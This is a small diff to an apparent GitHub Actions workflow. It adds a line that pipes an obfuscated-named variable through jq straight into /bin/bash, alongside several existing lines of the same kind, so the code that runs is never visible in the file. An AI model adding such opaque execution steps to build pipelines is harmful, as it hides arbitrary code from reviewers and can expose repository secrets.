@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$gnk2013" | jq -r .h19 | /bin/bash
           printf '%s' "$som84834" | jq -r .sa5782 | /bin/bash
           printf '%s' "$m846" | jq -r .sigt589 | /bin/bash
+          echo $xldzc1 | jq -r .no2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
